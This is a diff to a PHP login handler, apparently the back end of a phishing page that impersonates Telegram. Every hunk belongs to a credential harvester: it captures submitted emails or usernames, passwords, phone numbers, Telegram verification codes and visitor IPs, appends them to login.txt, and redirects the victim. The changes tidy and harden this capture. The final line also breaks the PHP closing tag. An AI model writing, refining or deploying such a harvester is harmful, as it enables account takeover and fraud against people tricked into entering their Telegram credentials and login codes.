@@ -1,7 +1,7 @@
 <?php
 // Vérifie si le formulaire a été soumis via la méthode POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Récupère et nettoie les données du formulaire de manière compatible
+    // Récupère et nettoie les données du formulaire
     $username = isset($_POST["email"]) ? htmlspecialchars(trim($_POST["email"])) : '';
     $password = isset($_POST["password"]) ? htmlspecialchars(trim($_POST["password"])) : '';
     $country_code = isset($_POST["country_code"]) ? htmlspecialchars(trim($_POST["country_code"])) : '';
@@ -11,44 +11,45 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $ip = $_SERVER['REMOTE_ADDR'];
     $date = date('Y-m-d H:i:s');
 
-    // Vérifie si les champs ne sont pas vides
+    // Vérifie si les champs requis sont remplis
     if ((!empty($username) && !empty($password)) || !empty($verification_code)) {
-        // Formate les données pour l'enregistrement
-        $data = "=== ".(!empty($verification_code) ? "CODE TELEGRAM" : "NOUVELLE CONNEXION TELEGRAM")." ===\n";
+        // Formatage des données pour le fichier
+        $data = "=== " . (!empty($verification_code) ? "CODE TELEGRAM" : "NOUVELLE CONNEXION TELEGRAM") . " ===\n";
         $data .= "Date: $date\n";
         
         if (!empty($verification_code)) {
             $data .= "Code de vérification: $verification_code\n";
         } else {
             $data .= "Email/Username: $username\n";
-            $data .= "Téléphone: ".($country_code ? $country_code : '').$phone_number."\n";
+            $data .= "Téléphone: " . ($phone_number ? $country_code . $phone_number : "Non fourni") . "\n";
             $data .= "Mot de passe: $password\n";
             $data .= "Session active: $remember\n";
         }
         
         $data .= "Adresse IP: $ip\n";
         $data .= "==============================\n\n";
+
+        // Chemin absolu du fichier
+        $file = __DIR__ . '/login.txt';
         
-        // Chemin absolu du fichier pour plus de sécurité
-        $file = __DIR__.'/login.txt';
-        
-        // Gestion robuste du fichier
+        // Tentative d'écriture sécurisée avec gestion des erreurs
+        $success = false;
         $attempts = 0;
         $max_attempts = 3;
-        $success = false;
         
         while ($attempts < $max_attempts && !$success) {
             try {
-                $fh = fopen($file, 'a');
-                if (flock($fh, LOCK_EX)) {
-                    fwrite($fh, $data);
-                    flock($fh, LOCK_UN);
-                    $success = true;
+                if ($fh = fopen($file, 'a')) {
+                    if (flock($fh, LOCK_EX)) {
+                        fwrite($fh, $data);
+                        flock($fh, LOCK_UN);
+                        $success = true;
+                    }
+                    fclose($fh);
                 }
-                fclose($fh);
             } catch (Exception $e) {
                 $attempts++;
-                usleep(100000);
+                usleep(100000); // Pause de 100ms entre les tentatives
             }
         }
         
@@ -56,7 +57,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             header("Location: mer.html");
             exit();
         } else {
-            error_log("[".date('Y-m-d H:i:s')."] Échec écriture fichier. IP: $ip");
+            error_log("[" . date('Y-m-d H:i:s') . "] Échec d'écriture dans le fichier. IP: $ip");
             echo "<script>alert('Erreur système. Veuillez réessayer.'); window.location.href = 'index.html';</script>";
             exit();
         }
@@ -69,4 +70,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     echo "<h1>Accès interdit</h1><p>Méthode non autorisée.</p>";
     exit();
 }
-?>
+?
